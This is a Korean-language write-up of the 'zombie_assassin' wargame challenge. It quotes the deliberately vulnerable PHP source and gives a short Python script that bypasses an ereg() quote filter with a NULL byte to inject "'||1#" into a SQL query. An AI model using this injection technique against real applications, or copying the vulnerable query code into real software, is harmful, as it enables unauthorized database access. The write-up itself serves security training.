## Zombie_assassin Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");  
if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");  
if(@ereg("'",$_GET[id])) exit("HeHe");  
if(@ereg("'",$_GET[pw])) exit("HeHe");  
$query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id']) solve("zombie_assassin");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

url = 'https://los.rubiya.kr/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php'
cookies = {'PHPSESSID' : 'My PHPSESSID'}
params = {}

params['id'] = 'admin'
params['pw'] = chr(0) + "'||1#"

res = requests.get(url, cookies=cookies, params=params)

if "Clear" in res.text :
    print("[♪] ZOMBIE_ASSASSIN Clear")
```
이번 문제는 **ereg()** 함수의 취약점을 이용하면 된다.  
ereg(argv1, argv2) 함수는 두번째 인자의 문자열에 첫번째 인자의 문자열이 있으면 true를 반환한다.  
이 함수의 취약점은 NULL 문자 전까지만 검사하는 것이다.  
따라서 NULL 문자를 넣어준 뒤 싱글쿼터를 넣어 우회할 수 있다.  
url에 입력할 때는 `%00`을 넣어주면 된다.